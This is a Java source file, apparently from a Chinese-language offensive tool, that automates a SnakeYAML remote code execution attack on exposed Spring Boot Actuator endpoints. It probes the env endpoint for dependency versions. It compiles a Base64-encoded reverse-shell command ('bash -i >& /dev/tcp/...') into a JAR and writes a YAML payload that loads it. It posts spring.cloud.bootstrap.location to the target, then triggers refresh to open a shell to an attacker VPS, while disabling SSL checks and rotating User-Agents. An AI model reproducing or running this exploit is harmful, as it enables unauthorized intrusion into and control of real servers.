package src.main.module;

import src.main.LoadLib.ClassCom.ClsComp;
import src.main.LoadLib.JARLoad.LoadJarLib;
import src.main.common.UA_Config;
import src.main.impl.ResultCallback;

import java.io.*;
import java.net.HttpURLConnection;
import java.net.URL;
import java.nio.charset.StandardCharsets;
import java.nio.file.Files;
import java.nio.file.Paths;
import java.util.Base64;
import java.util.List;
import java.util.regex.Matcher;
import java.util.regex.Pattern;

import static src.main.SSLVerify.sslVer.disableSSLVerification;

public class SnakeYamlRCE {
    private String address;
    private String vpsIP;
    public String text;
    public static  int count= 9950;
    public static  int count1 = 0;

    public String ymlpayload = "!!javax.script.ScriptEngineManager [\n" +
            "  !!java.net.URLClassLoader [[\n" +
            "    !!java.net.URL [\"http://127.0.0.1/SnakeYaml%d.jar\"]\n" +
            "  ]]\n" +
            "]";
    public String cmdtmp = "bash -i >& /dev/tcp/%s/%d 0>&1";
    public String expdata1 = "spring.cloud.bootstrap.location=http://%s/SnakeYamlYml.yml";
    public String expdata2 = "{\"name\":\"spring.cloud.bootstrap.location\",\"value\":\"http://%s/SnakeYamlYml.yml\"}";
    public SnakeYamlRCE(String address, String vpsIP){
        this.address = address;
        this.vpsIP = vpsIP;
    }
    public SnakeYamlRCE(String address){
        this.address = address;
    }


    public void Result1(ResultCallback callback){
        String site = address + "/env";
        String llib = "spring-boot-starter-actuator";
        String llib1 = "spring-cloud-starter";
        String data = "";
        String ref = "/refresh";
        String refsite = address + ref;
        String ua = "";
        disableSSLVerification();
        try{
            URL obj = new URL(site);
            HttpURLConnection conn = (HttpURLConnection) obj.openConnection();
            conn.setRequestMethod("GET");
            UA_Config uacf = new UA_Config();
            List<String> ualist = uacf.loadUserAgents();
            ua = uacf.getRandomUserAgent(ualist);
            conn.setRequestProperty("User-Agent",ua);
            int responseCode = conn.getResponseCode();
            if (responseCode == HttpURLConnection.HTTP_OK || (responseCode == HttpURLConnection.HTTP_INTERNAL_ERROR && count!=0)){
                InputStream inputStream = (responseCode == HttpURLConnection.HTTP_OK) ? conn.getInputStream() : conn.getErrorStream();
                BufferedReader in = new BufferedReader(new InputStreamReader(inputStream));
                String inputLine;
                StringBuilder response = new StringBuilder();
                while ((inputLine = in.readLine()) != null) {
                    response.append(inputLine);
                }
                in.close();
                if ((response.toString().contains(llib) && response.toString().contains(llib1)) || count != 0){
                    String regex = llib + "-(\\d+\\.\\d+\\.\\d+)";
                    Pattern pattern = Pattern.compile(regex);
                    Matcher matcher = pattern.matcher(response.toString());
                    String regex1 = llib1 + "-(\\d+\\.\\d+\\.\\d+)";
                    Pattern pattern1 = Pattern.compile(regex1);
                    Matcher matcher1 = pattern1.matcher(response.toString());
                    if (matcher.find() && matcher1.find()) {
                        text = String.format("spring-boot-starter-actuator 依赖为: %s", matcher.group(1));
                        callback.onResult(text);
                        text = String.format("spring-cloud-starter 依赖为: %s", matcher1.group(1));
                        callback.onResult(text);
                        String b64p = Base64.getEncoder().encodeToString(String.format(cmdtmp,vpsIP,count).getBytes());
                        ClsComp cc = new ClsComp(b64p);
                        boolean isModify = cc.modifyJavaClassFile("YAMLObject/SnakeYamlTemplate.java","SnakeYamlPayload/src/artsploit/AwesomeScriptEngineFactory.java",callback);
                        if (isModify){
                            try {
                                cc.CompileJava("/SnakeYamlPayload/src/artsploit/AwesomeScriptEngineFactory", "/SnakeYamlPayload/src/artsploit/AwesomeScriptEngineFactory", callback);
                            } catch (IOException e) {
                                return;
                            }
                            LoadJarLib lb = new LoadJarLib("SnakeYaml" + count1);
                            lb.loadJar(callback);
                            // 使用 String.format 格式化字符串
                            String formattedString = String.format(ymlpayload,count1);

                            try (BufferedWriter writer = new BufferedWriter(new FileWriter(System.getProperty("user.dir") + "/resources/SnakeYamlYml.yml"))) {
                                writer.write(formattedString);
                                text = "yml文件重写成功";
                                callback.onResult(text);
                            } catch (IOException e) {
                                text = "yml文件重写失败";
                                callback.onResult(text);
                                e.printStackTrace();
                            }
                            data = String.format(expdata1,vpsIP);
                            URL obj1 = new URL(site);
                            HttpURLConnection conn1 = (HttpURLConnection) obj1.openConnection();
                            ua = uacf.getRandomUserAgent(ualist);
                            conn1.setRequestProperty("User-Agent",ua);
                            conn1.setRequestProperty("Content-Type","application/x-www-form-urlencoded");
                            conn1.setRequestMethod("POST");
                            conn1.setDoOutput(true);
                            try (OutputStream os = conn1.getOutputStream()) {
                                byte[] input = data.getBytes(StandardCharsets.UTF_8);
                                os.write(input, 0, input.length);
                            }
                            int responseCode1 = conn1.getResponseCode();
                            if (responseCode1 == HttpURLConnection.HTTP_OK){
                                try{
                                    URL obj2 = new URL(refsite);
                                    HttpURLConnection conn2 = (HttpURLConnection) obj2.openConnection();
                                    conn2.setRequestMethod("POST");
                                    conn2.setRequestProperty("User-Agent",ua);
                                    conn2.setRequestProperty("Content-Type","application/x-www-form-urlencoded");
                                    conn2.setDoOutput(true);
                                    int responseCode2 = conn2.getResponseCode();
                                    if (responseCode2 == HttpURLConnection.HTTP_OK){
                                        text = "执行命令成功";
                                        callback.onResult(text);
                                        text = "当前反弹vpsIP: " + vpsIP + " " + "vpsPort: 9950";
                                        callback.onResult(text);
                                        count ++;
                                    }else{
                                        text = "错误：发送refresh请求失败，状态码为: " + responseCode2;
                                        callback.onResult(text);
                                    }
                                }catch (Exception e){
                                    text = "异常：发起refresh请求失败";
                                    callback.onResult(text);
                                    e.printStackTrace();
                                }
                            }
                        }else{
                            text = "生成jar包失败";
                            callback.onResult(text);
                        }
                    }else if (count != 0){
                        String b64p = Base64.getEncoder().encodeToString(String.format(cmdtmp,vpsIP,count).getBytes());
                        ClsComp cc = new ClsComp(b64p);
                        boolean isModify = cc.modifyJavaClassFile("YAMLObject/SnakeYamlTemplate.java","SnakeYamlPayload/src/artsploit/AwesomeScriptEngineFactory.java",callback);
                        if (isModify){
                            try {
                                cc.CompileJava("/SnakeYamlPayload/src/artsploit/AwesomeScriptEngineFactory", "/SnakeYamlPayload/src/artsploit/AwesomeScriptEngineFactory", callback);
                            } catch (IOException e) {
                                return;
                            }
                            LoadJarLib lb = new LoadJarLib("SnakeYaml" + count1);
                            lb.loadJar(callback);
                            // 使用 String.format 格式化字符串
                            String formattedString = String.format(ymlpayload,count1);

                            try (BufferedWriter writer = new BufferedWriter(new FileWriter(System.getProperty("user.dir") + "/resources/SnakeYamlYml.yml"))) {
                                writer.write(formattedString);
                                text = "yml文件重写成功";
                                callback.onResult(text);
                            } catch (IOException e) {
                                text = "yml文件重写失败";
                                callback.onResult(text);
                                e.printStackTrace();
                            }
                            data = String.format(expdata1,vpsIP);
                            URL obj1 = new URL(site);
                            HttpURLConnection conn1 = (HttpURLConnection) obj1.openConnection();
                            ua = uacf.getRandomUserAgent(ualist);
                            conn1.setRequestProperty("User-Agent",ua);
                            conn1.setRequestProperty("Content-Type","application/x-www-form-urlencoded");
                            conn1.setRequestMethod("POST");
                            conn1.setDoOutput(true);
                            try (OutputStream os = conn1.getOutputStream()) {
                                byte[] input = data.getBytes(StandardCharsets.UTF_8);
                                os.write(input, 0, input.length);
                            }
                            int responseCode1 = conn1.getResponseCode();
                            if (responseCode1 == HttpURLConnection.HTTP_OK){
                                try{
                                    URL obj2 = new URL(refsite);
                                    HttpURLConnection conn2 = (HttpURLConnection) obj2.openConnection();
                                    conn2.setRequestMethod("POST");
                                    conn2.setRequestProperty("User-Agent",ua);
                                    conn2.setRequestProperty("Content-Type","application/x-www-form-urlencoded");
                                    conn2.setDoOutput(true);
                                    int responseCode2 = conn2.getResponseCode();
                                    if (responseCode2 == HttpURLConnection.HTTP_OK){
                                        text = "执行命令成功";
                                        callback.onResult(text);
                                        text = "当前反弹vpsIP: " + vpsIP + " " + "vpsPort: 9950";
                                        callback.onResult(text);
                                        count ++;
                                    }else{
                                        text = "错误：发送refresh请求失败，状态码为: " + responseCode2;
                                        callback.onResult(text);
                                    }
                                }catch (Exception e){
                                    text = "异常：发起refresh请求失败";
                                    callback.onResult(text);
                                    e.printStackTrace();
                                }
                            }
                        }else{
                            text = "生成jar包失败";
                            callback.onResult(text);
                        }
                    }else{
                        text = "未找到依赖";
                        callback.onResult(text);
                    }
                }else {
                    text = "发送env请求失败";
                    callback.onResult(text);
                }
            }else{
                text = "检测服务器状态异常";
                callback.onResult(text);
            }
        }catch (Exception e){
            text = "检测依赖异常";
            callback.onResult(text);
            e.printStackTrace();
        }
    }
    public void Result2(ResultCallback callback){
        String site = address + "/actuator/env";
        String llib = "spring-boot-starter-actuator";
        String llib1 = "spring-cloud-starter";
        String data = "";
        String ref = "/actuator/refresh";
        String refsite = address + ref;
        String ua = "";
        disableSSLVerification();
        try{
            URL obj = new URL(site);
            HttpURLConnection conn = (HttpURLConnection) obj.openConnection();
            conn.setRequestMethod("GET");
            UA_Config uacf = new UA_Config();
            List<String> ualist = uacf.loadUserAgents();
            ua = uacf.getRandomUserAgent(ualist);
            conn.setRequestProperty("User-Agent",ua);
            int responseCode = conn.getResponseCode();
            BufferedReader in = new BufferedReader(new InputStreamReader(conn.getInputStream()));
            String inputLine;
            StringBuilder response = new StringBuilder();
            while ((inputLine = in.readLine()) != null) {
                response.append(inputLine);
            }
            in.close();
            if (responseCode == HttpURLConnection.HTTP_OK && response.toString().contains(llib) && response.toString().contains(llib1)) {
                String regex = llib + "-(\\d+\\.\\d+\\.\\d+)";
                Pattern pattern = Pattern.compile(regex);
                Matcher matcher = pattern.matcher(response.toString());
                String regex1 = llib1 + "-(\\d+\\.\\d+\\.\\d+)";
                Pattern pattern1 = Pattern.compile(regex1);
                Matcher matcher1 = pattern1.matcher(response.toString());
                if (matcher.find() && matcher1.find()) {
                    text = String.format("spring-boot-starter-actuator 依赖为: %s", matcher.group(1));
                    callback.onResult(text);
                    text = String.format("spring-cloud-starter 依赖为: %s", matcher1.group(1));
                    callback.onResult(text);
                    String b64p = Base64.getEncoder().encodeToString(String.format(cmdtmp,vpsIP).getBytes());
                    ClsComp cc = new ClsComp(b64p);
                    boolean isModify = cc.modifyJavaClassFile("/YAMLObject/SnakeYamlTemplate.java","SnakeYaml.java",callback);
                    if (isModify){
                        cc.CompileJava("SnakeYaml","SnakeYaml",callback);
                        LoadJarLib lb = new LoadJarLib("SnakeYaml");
                        lb.loadJar(callback);
                        Files.delete(Paths.get(System.getProperty("user.dir") + "/resources/SnakeYaml.java"));
                        Files.delete(Paths.get(System.getProperty("user.dir") + "/resources/SnakeYaml.class"));
                        data = String.format(expdata2,vpsIP);
                        URL obj1 = new URL(site);
                        HttpURLConnection conn1 = (HttpURLConnection) obj1.openConnection();
                        ua = uacf.getRandomUserAgent(ualist);
                        conn1.setRequestProperty("User-Agent",ua);
                        conn1.setRequestProperty("Content-Type","application/json");
                        conn1.setRequestMethod("POST");
                        conn1.setDoOutput(true);
                        try (OutputStream os = conn1.getOutputStream()) {
                            byte[] input = data.getBytes(StandardCharsets.UTF_8);
                            os.write(input, 0, input.length);
                        }
                        int responseCode1 = conn1.getResponseCode();
                        if (responseCode1 == HttpURLConnection.HTTP_OK){
                            try{
                                URL obj2 = new URL(refsite);
                                HttpURLConnection conn2 = (HttpURLConnection) obj2.openConnection();
                                conn2.setRequestMethod("POST");
                                conn2.setRequestProperty("User-Agent",ua);
                                conn2.setRequestProperty("Content-Type","application/json");
                                conn2.setDoOutput(true);
                                int responseCode2 = conn2.getResponseCode();
                                if (responseCode2 == HttpURLConnection.HTTP_OK){
                                    text = "执行命令成功";
                                    callback.onResult(text);
                                    text = "当前反弹vpsIP: " + vpsIP + " " + "vpsPort: 9950";
                                    callback.onResult(text);
                                }else{
                                    text = "错误：发送refresh请求失败，状态码为: " + responseCode2;
                                    callback.onResult(text);
                                }
                            }catch (Exception e){
                                text = "异常：发起refresh请求失败";
                                callback.onResult(text);
                                e.printStackTrace();
                            }
                        }
                    }else{
                        text = "生成jar包失败";
                        callback.onResult(text);
                    }
                }else{
                    text = "未找到依赖";
                    callback.onResult(text);
                }
            }else {
                text = "发送env请求失败";
                callback.onResult(text);
            }
        }catch (Exception e){
            text = "检测依赖异常";
            callback.onResult(text);
            e.printStackTrace();
        }
    }
    public void Exp(ResultCallback callback) throws IOException {
        String api ="/actuator/env";
        String site = address + api;
        String ua = "";
        try{
            URL obj = new URL(site);
            HttpURLConnection conn = (HttpURLConnection) obj.openConnection();
            UA_Config uacf = new UA_Config();
            List<String> ualist = uacf.loadUserAgents();
            ua = uacf.getRandomUserAgent(ualist);
            conn.setRequestProperty("User-Agent",ua);
            conn.setRequestMethod("GET");
            int responseCode = conn.getResponseCode();
            if (responseCode == HttpURLConnection.HTTP_OK) {
                // 存在路径是springboot2，否则是springboot1
                text = "当前版本为springboot2";
                callback.onResult("当前版本为springboot2");
                Result2(callback);
            }else if (responseCode == HttpURLConnection.HTTP_NOT_FOUND){
                text = "当前版本为springboot1";
                callback.onResult("当前版本为springboot1");
                Result1(callback);
            }else{
                callback.onResult("未识别springboot版本");
            }
        }catch (IOException e){
            text = "检测springboot版本异常";
            callback.onResult(text);
            e.printStackTrace();
        }
    }
}
